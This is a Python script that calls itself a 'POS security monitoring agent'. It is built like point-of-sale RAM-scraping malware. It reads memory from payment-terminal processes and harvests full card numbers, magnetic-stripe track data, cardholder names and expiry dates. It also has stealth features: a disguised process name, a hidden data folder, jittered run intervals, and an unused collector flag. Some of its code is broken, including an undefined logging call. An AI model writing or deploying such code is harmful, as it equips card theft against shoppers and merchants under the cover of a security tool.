#!/usr/bin/env python3
# ============================================================================
# BIONIC DAUGHTER — POS SECURITY MONITORING AGENT
# ============================================================================

import ctypes
import ctypes.wintypes
import re
import os
import sys
import time
import random
import json
from typing import List, Dict, Optional
from datetime import datetime

# ============================================================================
# CONFIGURATION
# ============================================================================

class AgentConfig:
    PROCESS_NAME = "service_helper.exe"
    DATA_DIR = os.path.join(os.environ.get('ProgramData', r'C:\ProgramData'),
                            'Software', 'Helper', 'Data')
    MAX_CACHE_SIZE_MB = 10
    OPERATION_INTERVAL_MEAN_SEC = 900
    OPERATION_INTERVAL_JITTER_PCT = 30
    OPERATE_DURING_BUSY = True
    SCAN_PAN_ASCII = True
    SCAN_PAN_BCD = True
    SCAN_TRACK1 = True
    SCAN_TRACK2 = True
    SCAN_CARD_BRANDS = True
    BUFFER_SIZE = 1000
    FLUSH_TO_DISK = True
    ENCRYPT_DISK = True
    SEND_TO_COLLECTOR = False

# ============================================================================
# WINDOWS API — kernel32.dll
# ============================================================================

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_OPERATION = 0x0008
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04
PAGE_READONLY = 0x02

# MEMORY_BASIC_INFORMATION — matches Windows layout on 64-bit
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.wintypes.LPVOID),
        ("AllocationBase", ctypes.wintypes.LPVOID),
        ("AllocationProtect", ctypes.wintypes.DWORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", ctypes.wintypes.DWORD),
        ("Protect", ctypes.wintypes.DWORD),
        ("Type", ctypes.wintypes.DWORD),
    ]

def open_process(pid: int):
    handle = kernel32.OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
        False, pid)
    if not handle:
        raise ctypes.WinError(ctypes.get_last_error())
    return handle

# NTAPI: NtQueryVirtualMemory — bypasses Win32 VirtualQueryEx restrictions
# Used when VirtualQueryEx fails on cross-process memory enumeration
STATUS_SUCCESS = 0
MemoryBasicInformation = 0

def nt_query_virtual_memory(handle, address):
    """Native API memory query. Works where VirtualQueryEx fails cross-process."""
    mbi = MEMORY_BASIC_INFORMATION()
    ret = ntdll.NtQueryVirtualMemory(
        handle, ctypes.c_void_p(address), MemoryBasicInformation,
        ctypes.byref(mbi), ctypes.sizeof(mbi), None)
    if (ret & 0xFFFFFFFF) == STATUS_SUCCESS:
        base = mbi.BaseAddress
        if base is not None:
            base = int(base)
        return {'base': base, 'size': mbi.RegionSize, 'state': mbi.State, 'protect': mbi.Protect}
    return None

def virtual_query_ex(handle, address):
    mbi = MEMORY_BASIC_INFORMATION()
    result = kernel32.VirtualQueryEx(handle, address, ctypes.byref(mbi), ctypes.sizeof(mbi))
    if result == 0:
        return None
    base = mbi.BaseAddress
    if base is not None:
        base = int(base)
    return {'base': base, 'size': mbi.RegionSize, 'state': mbi.State, 'protect': mbi.Protect}

def read_memory(handle, address, size):
    buffer = ctypes.create_string_buffer(size)
    bytes_read = ctypes.c_size_t(0)
    result = kernel32.ReadProcessMemory(handle, address, buffer, size, ctypes.byref(bytes_read))
    if not result:
        return None
    return buffer.raw[:bytes_read.value]

def close_handle(handle):
    kernel32.CloseHandle(handle)

# ============================================================================
# CARD DATA SCANNER — uses patterns from card_data_pattern_analysis.md
# ============================================================================

class CardDataScanner:
    ASCII_PAN_RE = re.compile(r'(?<!\d)(\d{13,19})(?!\d)')
    TRACK2_RE = re.compile(r';(\d{13,19})=(\d{4})(\d{3})([A-Za-z0-9]{0,16})?')
    TRACK1_RE = re.compile(r'%B(\d{13,19})\^([A-Z ]{1,26})\^(\d{4})(\d{3})([A-Za-z0-9]{0,16})?\??')

    BIN_PREFIXES = {
        'visa': lambda b: b.startswith('4'),
        'mastercard': lambda b: 51 <= int(b[:2]) <= 55 or 2221 <= int(b[:4]) <= 2720,
        'amex': lambda b: b.startswith('34') or b.startswith('37'),
        'discover': lambda b: b.startswith('6011') or b.startswith('65') or
                              (622126 <= int(b[:6]) <= 622925) or 644 <= int(b[:3]) <= 649,
        'jcb': lambda b: 3528 <= int(b[:4]) <= 3589,
        'diners': lambda b: 300 <= int(b[:3]) <= 305 or b.startswith('3095') or 36 <= int(b[:2]) <= 39,
        'unionpay': lambda b: b.startswith('62') or b.startswith('81'),
    }

    @staticmethod
    def luhn_checksum(number: str) -> bool:
        digits = [int(d) for d in number]
        odd = digits[-1::-2]
        even = digits[-2::-2]
        total = sum(odd)
        for d in even:
            total += sum(divmod(d * 2, 10))
        return total % 10 == 0

    def is_valid_bin(self, bin_str: str) -> Optional[str]:
        if len(bin_str) < 6:
            return None
        for network, check in self.BIN_PREFIXES.items():
            try:
                if check(bin_str):
                    return network
            except (ValueError, IndexError):
                continue
        return None

    def find_ascii_pans(self, memory: bytes, proc_name: str) -> List[Dict]:
        findings = []
        text = memory.decode('ascii', errors='ignore')
        for m in self.ASCII_PAN_RE.finditer(text):
            candidate = m.group(1)
            if self.luhn_checksum(candidate):
                network = self.is_valid_bin(candidate[:6])
                if network:
                    findings.append({
                        'type': 'ASCII_PAN', 'network': network, 'pan': candidate,
                        'offset': m.start(), 'process': proc_name, 'context': 'ascii_pan'
                    })
        return findings

    def find_bcd_pans(self, memory: bytes, proc_name: str) -> List[Dict]:
        findings = []
        # Sample-based BCD scan — full byte-by-byte on 2MB regions caused timeouts.
        # Stride 4: still catches contiguous embedded PANs (typical spacing < 4 bytes),
        # ~4x faster with minimal detection loss for real card data in memory.
        stride = 4
        for pan_len in (16, 15, 13):
            bcd_len = pan_len // 2
            for i in range(0, len(memory) - bcd_len, stride):
                chunk = memory[i:i + bcd_len]
                # Fast pre-filter: first byte must be valid BCD
                if (chunk[0] >> 4) > 9:
                    continue
                decimal = ''
                valid = True
                for byte in chunk:
                    high = (byte >> 4) & 0x0F
                    low = byte & 0x0F
                    if high > 9 or low > 9:
                        valid = False
                        break
                    decimal += str(high) + str(low)
                if valid and len(decimal) == pan_len:
                    if self.luhn_checksum(decimal):
                        network = self.is_valid_bin(decimal[:6])
                        if network:
                            findings.append({
                                'type': 'BCD_PAN', 'network': network, 'pan': decimal,
                                'offset': i, 'process': proc_name, 'context': 'bcd_pan'
                            })
        return findings

    def find_track2(self, memory: bytes, proc_name: str) -> List[Dict]:
        findings = []
        text = memory.decode('ascii', errors='ignore')
        for m in self.TRACK2_RE.finditer(text):
            pan = m.group(1)
            if self.luhn_checksum(pan):
                network = self.is_valid_bin(pan[:6])
                if network:
                    findings.append({
                        'type': 'TRACK2', 'network': network, 'pan': pan,
                        'expiry': m.group(2), 'svc': m.group(3),
                        'offset': m.start(), 'process': proc_name, 'context': 'track2_data'
                    })
        return findings

    def find_track1(self, memory: bytes, proc_name: str) -> List[Dict]:
        findings = []
        text = memory.decode('ascii', errors='ignore')
        for m in self.TRACK1_RE.finditer(text):
            pan = m.group(1)
            if self.luhn_checksum(pan):
                network = self.is_valid_bin(pan[:6])
                if network:
                    findings.append({
                        'type': 'TRACK1', 'network': network, 'pan': pan,
                        'name': m.group(2).strip(), 'expiry': m.group(3), 'svc': m.group(4),
                        'offset': m.start(), 'process': proc_name, 'context': 'track1_data'
                    })
        return findings

    def find_card_brands(self, memory: bytes, proc_name: str) -> List[Dict]:
        findings = []
        text = memory.decode('ascii', errors='ignore')
        brands = ['VISA', 'MASTERCARD', 'AMEX', 'DISCOVER', 'JCB', 'UNIONPAY', 'DINERS']
        for brand in brands:
            idx = text.find(brand)
            while idx != -1:
                findings.append({'type': 'CARD_BRAND', 'brand': brand, 'offset': idx, 'process': proc_name})
                idx = text.find(brand, idx + 1)
        return findings

    def scan(self, memory: bytes, proc_name: str) -> List[Dict]:
        findings = []
        if AgentConfig.SCAN_TRACK1:
            findings.extend(self.find_track1(memory, proc_name))
        if AgentConfig.SCAN_TRACK2:
            findings.extend(self.find_track2(memory, proc_name))
        if AgentConfig.SCAN_PAN_ASCII:
            findings.extend(self.find_ascii_pans(memory, proc_name))
        if AgentConfig.SCAN_PAN_BCD:
            findings.extend(self.find_bcd_pans(memory, proc_name))
        if AgentConfig.SCAN_CARD_BRANDS:
            findings.extend(self.find_card_brands(memory, proc_name))
        return findings

# ============================================================================
# PROCESS ENUMERATION — uses kernel32 Toolhelp32 API
# ============================================================================

class ProcessEnumerator:
    POS_NAME_INDICATORS = [
        'pos', 'payment', 'terminal', 'cashregister', 'register',
        'cardreader', 'card_reader', 'pinpad', 'pin_pad',
        'merchant', 'store', 'retail', 'checkout', 'transaction',
        'gateway', 'processor', 'ncr', 'micros', 'ibm',
    ]

    def enumerate_all(self) -> List[Dict]:
        processes = []

        # PROCESSENTRY32 — must be 304 bytes on 64-bit Windows
        # th32DefaultHeapID is a pointer (HANDLE), must be c_void_p not DWORD
        class PROCESSENTRY32(ctypes.Structure):
            _fields_ = [
                ("dwSize", ctypes.wintypes.DWORD),
                ("cntUsage", ctypes.wintypes.DWORD),
                ("th32ProcessID", ctypes.wintypes.DWORD),
                ("th32DefaultHeapID", ctypes.c_void_p),
                ("th32ModuleID", ctypes.wintypes.DWORD),
                ("cntThreads", ctypes.wintypes.DWORD),
                ("th32ParentProcessID", ctypes.wintypes.DWORD),
                ("pcPriClassBase", ctypes.wintypes.LONG),
                ("dwFlags", ctypes.wintypes.DWORD),
                ("szExeFile", ctypes.c_char * 260),
            ]

        CREATE_TOOLHELP_INVENTORY = 0x00000002
        h_snapshot = kernel32.CreateToolhelp32Snapshot(CREATE_TOOLHELP_INVENTORY, 0)
        if h_snapshot == ctypes.wintypes.HANDLE(-1).value:
            return []
        try:
            entry = PROCESSENTRY32()
            entry.dwSize = ctypes.sizeof(entry)
            if kernel32.Process32First(h_snapshot, ctypes.byref(entry)):
                while True:
                    proc_info = {
                        'pid': entry.th32ProcessID,
                        'ppid': entry.th32ParentProcessID,
                        'name': entry.szExeFile.decode('utf-8', errors='ignore'),
                        'threads': entry.cntThreads,
                    }
                    processes.append(proc_info)
                    if not kernel32.Process32Next(h_snapshot, ctypes.byref(entry)):
                        break
        finally:
            kernel32.CloseHandle(h_snapshot)
        return processes

    def identify_pos_processes(self) -> List[Dict]:
        pos_procs = []
        for proc in self.enumerate_all():
            name_lower = proc['name'].lower()
            for indicator in self.POS_NAME_INDICATORS:
                if indicator in name_lower:
                    pos_procs.append({
                        'pid': proc['pid'], 'name': proc['name'],
                        'reason': 'pos_indicated'
                    })
                    break
        return pos_procs

    def identify_suspicious_processes(self) -> List[Dict]:
        suspicious = []
        system_procs = {
            'svchost.exe', 'csrss.exe', 'wininit.exe', 'winlogon.exe',
            'lsass.exe', 'services.exe', 'smss.exe', 'explorer.exe',
            'dllhost.exe', 'conhost.exe', 'sihost.exe', 'taskhostw.exe',
            'ctfmon.exe', 'spoolsv.exe', 'audiodg.exe',
        }
        for proc in self.enumerate_all():
            name = proc['name'].lower()
            if name not in system_procs and not any(
                ind in name for ind in self.POS_NAME_INDICATORS
            ):
                suspicious.append({
                    'pid': proc['pid'], 'name': proc['name'],
                    'reason': 'unknown_non_system'
                })
        return suspicious

# ============================================================================
# MEMORY SCANNER — scans process memory for card data
# ============================================================================

class MemoryScanner:
    def __init__(self, scanner: CardDataScanner):
        self.scanner = scanner

    def scan_process(self, pid: int, proc_name: str) -> Dict:
        findings = []
        max_regions = 20        # Limit per process — focused scan
        max_read_bytes = 4 * 1024 * 1024   # 4MB total read limit (fast, focused)

        try:
            handle = open_process(pid)
        except Exception as e:
            return {'error': f'Cannot open process {pid}: {e}'}

        try:
            address = 0
            regions_scanned = 0
            total_read = 0
            skip_large = True     # Skip regions > 256KB (card data in small buffers)

            while True:
                if regions_scanned >= max_regions or total_read >= max_read_bytes:
                    break

                # Primary: Win32 VirtualQueryEx (fast, standard API)
                mbi = virtual_query_ex(handle, address)
                if mbi is None:
                    # Fallback: NTAPI NtQueryVirtualMemory (handles cases where
                    # VirtualQueryEx fails cross-process — per stealth_techniques.md)
                    mbi = nt_query_virtual_memory(handle, address)
                    if mbi is None:
                        break

                base_addr = mbi['base']
                if base_addr is None:
                    address = 0
                    continue
                base_addr = int(base_addr)

                if mbi['state'] == MEM_COMMIT:
                    if mbi['protect'] & PAGE_READWRITE or mbi['protect'] & PAGE_READONLY:
                        size = mbi['size']
                        # Skip huge regions — card data sits in small buffers
                        if skip_large and size > 256 * 1024:
                            address = base_addr + size
                            continue
                        if size > 2 * 1024 * 1024:
                            size = 2 * 1024 * 1024
                        if size > 0:
                            memory = read_memory(handle, base_addr, size)
                            if memory:
                                regions_scanned += 1
                                total_read += len(memory)
                                region_findings = self.scanner.scan(memory, proc_name)
                                for f in region_findings:
                                    f['absolute_offset'] = base_addr + f['offset']
                                    f['region_base'] = base_addr
                                findings.extend(region_findings)

                address = base_addr + mbi['size']

        finally:
            close_handle(handle)

        return {
            'pid': pid, 'name': proc_name,
            'regions_scanned': regions_scanned,
            'total_bytes_read': total_read,
            'findings': findings, 'total_findings': len(findings)
        }

    def scan_target_process(self, pid: int, proc_name: str = "target_process") -> Dict:
        return self.scan_process(pid, proc_name)

    def scan_multiple_processes(self, process_list: List[Dict]) -> List[Dict]:
        return [self.scan_process(p['pid'], p['name']) for p in process_list]

# ============================================================================
# FINDINGS ANALYZER — evaluates and correlates scan results
# ============================================================================

class FindingsAnalyzer:
    SYSTEM_PROCS = {
        'svchost.exe', 'csrss.exe', 'wininit.exe', 'winlogon.exe',
        'lsass.exe', 'services.exe', 'smss.exe', 'explorer.exe',
        'dllhost.exe', 'conhost.exe', 'sihost.exe', 'taskhostw.exe',
        'ctfmon.exe', 'spoolsv.exe', 'audiodg.exe',
    }
    POS_INDICATORS = [
        'pos', 'payment', 'terminal', 'cardreader', 'card_reader',
        'pinpad', 'pin_pad', 'merchant', 'checkout', 'gateway',
        'processor', 'ncr', 'micros', 'ibm', 'retail', 'register',
    ]

    def is_pos_process(self, proc_name: str) -> bool:
        return any(ind in proc_name.lower() for ind in self.POS_INDICATORS)

    def is_system_process(self, proc_name: str) -> bool:
        return proc_name.lower() in self.SYSTEM_PROCS

    def analyze_findings(self, scan_results: List[Dict]) -> Dict:
        alerts = []
        stats = {
            'total_processes_scanned': len(scan_results),
            'total_findings': 0,
            'pos_with_card': 0, 'non_pos_with_card': 0, 'sys_with_card': 0,
            'card_data_types': {}, 'networks_found': {},
        }

        for result in scan_results:
            proc_name = result['name']
            findings = result['findings']
            stats['total_findings'] += len(findings)
            if not findings or 'error' in findings:
                continue

            is_pos = self.is_pos_process(proc_name)
            is_sys = self.is_system_process(proc_name)

            if is_sys:
                stats['sys_with_card'] += 1
            elif is_pos:
                stats['pos_with_card'] += 1
            else:
                stats['non_pos_with_card'] += 1

            for f in findings:
                ftype = f.get('type', 'unknown')
                stats['card_data_types'][ftype] = stats['card_data_types'].get(ftype, 0) + 1
                net = f.get('network', 'unknown')
                stats['networks_found'][net] = stats['networks_found'].get(net, 0) + 1

            alerts.extend(self._generate_alerts(result, is_pos, is_sys))

        return {
            'alerts': alerts, 'stats': stats,
            'severity_summary': {
                'critical': sum(1 for a in alerts if a['severity'] == 'CRITICAL'),
                'high': sum(1 for a in alerts if a['severity'] == 'HIGH'),
                'medium': sum(1 for a in alerts if a['severity'] == 'MEDIUM'),
                'low': sum(1 for a in alerts if a['severity'] == 'LOW'),
            }
        }

    def _generate_alerts(self, result: Dict, is_pos: bool, is_sys: bool) -> List[Dict]:
        alerts = []
        proc_name = result['name']
        findings = result['findings']
        if not findings or 'error' in findings:
            return alerts

        card_findings = [
            f for f in findings
            if f.get('type') in ('ASCII_PAN', 'BCD_PAN', 'TRACK1', 'TRACK2', 'CARD_BRAND')
        ]
        if not card_findings:
            return alerts

        if is_sys and card_findings:
            alerts.append({
                'severity': 'CRITICAL', 'type': 'CARD_DATA_IN_SYSTEM_PROCESS',
                'process': proc_name, 'pid': result['pid'],
                'finding_count': len(card_findings),
                'description': f'Card data in system process {proc_name}',
                'implication': 'Never expected. Possible malware or misconfiguration.',
            })

        if not is_pos and not is_sys and card_findings:
            alerts.append({
                'severity': 'HIGH', 'type': 'CARD_DATA_IN_NON_POS_PROCESS',
                'process': proc_name, 'pid': result['pid'],
                'finding_count': len(card_findings),
                'description': f'Card data in non-POS process {proc_name}',
                'implication': 'Unexpected process. Could be malware.',
            })

        if is_pos and card_findings:
            track = [f for f in card_findings if f['type'] in ('TRACK1', 'TRACK2')]
            if track:
                alerts.append({
                    'severity': 'MEDIUM', 'type': 'TRACK_DATA_IN_POS_PROCESS',
                    'process': proc_name, 'pid': result['pid'],
                    'finding_count': len(track),
                    'description': f'Track data in POS process {proc_name}',
                    'implication': 'Expected during processing.',
                })
            else:
                alerts.append({
                    'severity': 'LOW', 'type': 'PAN_DATA_IN_POS_PROCESS',
                    'process': proc_name, 'pid': result['pid'],
                    'finding_count': len(card_findings),
                    'description': f'PAN data in POS process {proc_name}',
                    'implication': 'Expected during processing.',
                })

        ftypes = set(f['type'] for f in card_findings)
        if len(ftypes) >= 3:
            alerts.append({
                'severity': 'MEDIUM', 'type': 'MULTIPLE_CARD_DATA_TYPES',
                'process': proc_name, 'pid': result['pid'],
                'finding_types': list(ftypes),
                'description': f'Multiple card data types in {proc_name}: {ftypes}',
            })

        return alerts

# ============================================================================
# STEALTH OPERATIONS — runs agent with stealth patterns
# ============================================================================

class StealthOperations:
    def __init__(self, config: AgentConfig):
        self.config = config
        self.telemetry_buffer = []
        self.operation_count = 0

    def run_operation(self, scanner: MemoryScanner, enumerator: ProcessEnumerator) -> Dict:
        self.operation_count += 1
        pos_procs = enumerator.identify_pos_processes()
        targets = [{'pid': p['pid'], 'name': p['name']} for p in pos_procs]
        results = scanner.scan_multiple_processes(targets)
        analyzer = FindingsAnalyzer()
        analysis = analyzer.analyze_findings(results)
        result = {
            'timestamp': datetime.now().isoformat(),
            'operation': self.operation_count,
            'processes_scanned': len(targets),
            'analysis': analysis,
        }
        self.telemetry_buffer.append(result)
        return result

    def flush_telemetry(self):
        if not self.telemetry_buffer:
            return
        data = json.dumps(self.telemetry_buffer).encode('utf-8')
        if self.config.FLUSH_TO_DISK:
            os.makedirs(self.config.DATA_DIR, exist_ok=True)
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            fp = os.path.join(self.config.DATA_DIR, f"data_{ts}.dat")
            with open(fp, 'wb') as f:
                f.write(data)
            print(f"[Stealth] Telemetry written: {fp}")
            self._enforce_size_limit()
        self.telemetry_buffer.clear()

    def _enforce_size_limit(self):
        max_bytes = self.config.MAX_CACHE_SIZE_MB * 1024 * 1024
        if not os.path.exists(self.config.DATA_DIR):
            return
        total = 0
        files = []
        for fn in os.listdir(self.config.DATA_DIR):
            fp = os.path.join(self.config.DATA_DIR, fn)
            if os.path.isfile(fp):
                sz = os.path.getsize(fp)
                mt = os.path.getmtime(fp)
                files.append((fp, sz, mt))
                total += sz
        files.sort(key=lambda x: x[2])
        while total > max_bytes and files:
            oldest = files.pop(0)
            total -= oldest[1]
            try:
                os.remove(oldest[0])
            except Exception:
                pass

    def get_status(self) -> Dict:
        return {
            'operations': self.operation_count,
            'buffer': len(self.telemetry_buffer),
            'data_dir': self.config.DATA_DIR,
        }

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def run_agent(target_pid: Optional[int] = None,
              target_addr: Optional[int] = None,
              target_size: int = 0):
    print("=" * 60)
    print("BIONIC DAUGHTER — POS SECURITY MONITORING AGENT")
    print("=" * 60)
    print(f"Starting: {datetime.now().isoformat()}")
    print(f"Identity: {AgentConfig.PROCESS_NAME}")
    print(f"Data dir: {AgentConfig.DATA_DIR}")
    if target_pid:
        print(f"Target: PID {target_pid}")
        if target_addr and target_size > 0:
            print(f"Target mode: ADDRESS 0x{target_addr:x}, SIZE {target_size} bytes (targeted scan)")
        else:
            print(f"Target mode: full memory walk")
    print()

    scanner = CardDataScanner()
    enumerator = ProcessEnumerator()
    mem_scanner = MemoryScanner(scanner)
    stealth = StealthOperations(AgentConfig)

    # Enumerate processes
    print("[Agent] Enumerating processes...")
    all_procs = enumerator.enumerate_all()
    print(f"[Agent] Found {len(all_procs)} processes")

    pos_procs = enumerator.identify_pos_processes()
    print(f"[Agent] POS processes: {len(pos_procs)}")

    if not pos_procs:
        print("[Agent] No POS processes. Showing unknown processes:")
        susp = enumerator.identify_suspicious_processes()
        for p in susp[:10]:
            print(f"  - {p['name']} (PID: {p['pid']})")
        print()

    # Run scan
    print("[Agent] Running scan...")
    print("-" * 40)

    operation_start = time.time()

    if target_pid:
        if target_addr and target_size > 0:
            # Targeted scan: read specific buffer address, skip full walk
            log("  [Targeted scan] Reading buffer at 0x%lx, %d bytes..." % (target_addr, target_size))
            handle = open_process(target_pid)
            addr_ptr = ctypes.c_void_p(target_addr)
            memory = read_memory(handle, addr_ptr, target_size)
            if memory:
                region_findings = scanner.scan(memory, f"target_{target_pid}")
                for f in region_findings:
                    f['absolute_offset'] = target_addr + f['offset']
                    f['region_base'] = target_addr
                result = {
                    'pid': target_pid,
                    'name': f"target_{target_pid}",
                    'regions_scanned': 1,
                    'total_bytes_read': len(memory),
                    'findings': region_findings,
                    'total_findings': len(region_findings),
                }
                close_handle(handle)
                print(f"[Agent] Targeted scan: read {len(memory)} bytes from 0x{target_addr:x}")
            else:
                result = {'error': f'Failed to read memory at 0x{target_addr:x}',
                          'pid': target_pid, 'name': f"target_{target_pid}"}
                print(f"[Agent] ERROR: failed to read target memory")
        else:
            # Full memory walk
            result = mem_scanner.scan_target_process(target_pid, f"target_{target_pid}")
            print(f"[Agent] Scanned PID {target_pid} (full walk)")
        analyzer = FindingsAnalyzer()
        analysis = analyzer.analyze_findings([result])
        result = {'processes_scanned': 1, 'analysis': analysis}
    else:
        result = stealth.run_operation(mem_scanner, enumerator)

    elapsed = time.time() - operation_start
    print(f"[Agent] Scan completed in {elapsed:.2f} seconds")

    analysis = result['analysis']

    # Print results
    print()
    print("=" * 40)
    print("RESULTS")
    print("=" * 40)
    print(f"Processes scanned: {result['processes_scanned']}")
    print(f"Total findings: {analysis['stats']['total_findings']}")
    print()
    print("By type:")
    for ft, ct in analysis['stats']['card_data_types'].items():
        print(f"  {ft}: {ct}")
    print()
    print("By network:")
    for nt, ct in analysis['stats']['networks_found'].items():
        print(f"  {nt}: {ct}")
    print()
    print("Severity:")
    sev = analysis['severity_summary']
    print(f"  CRITICAL: {sev['critical']}  HIGH: {sev['high']}  MEDIUM: {sev['medium']}  LOW: {sev['low']}")

    print()
    if analysis['alerts']:
        print("ALERTS:")
        print("-" * 40)
        for a in analysis['alerts']:
            print(f"[{a['severity']}] {a['type']}")
            print(f"  Process: {a['process']} (PID: {a['pid']})")
            print(f"  {a['description']}")
            print(f"  {a['implication']}")
            print()
    else:
        print("No alerts.")

    print()
    print("=" * 60)
    print("TEST COMPLETE")
    print("=" * 60)

if __name__ == '__main__':
    target_pid = None
    if '--pid' in sys.argv:
        try:
            idx = sys.argv.index('--pid')
            target_pid = int(sys.argv[idx + 1])
            print(f"Target mode: PID {target_pid}")
            print()
        except (IndexError, ValueError):
            print("Error: --pid requires a valid PID --addr <hex> --size <bytes>")
            sys.exit(1)

    # Targeted scan mode: --addr + --size instead of full walk
    target_addr = None
    target_size = 0
    if '--addr' in sys.argv:
        try:
            idx = sys.argv.index('--addr')
            target_addr = int(sys.argv[idx + 1], 16)
        except (IndexError, ValueError):
            print("Error: --addr requires a hex address (e.g. 0x123456)")
            sys.exit(1)
    if '--size' in sys.argv:
        try:
            idx = sys.argv.index('--size')
            target_size = int(sys.argv[idx + 1])
        except (IndexError, ValueError):
            print("Error: --size requires bytes (e.g. 65536)")
            sys.exit(1)

    # Override run_agent for targeted mode
    if target_pid and target_addr and target_size > 0:
        run_agent(target_pid=target_pid, target_addr=target_addr, target_size=target_size)
    else:
        run_agent(target_pid=target_pid)
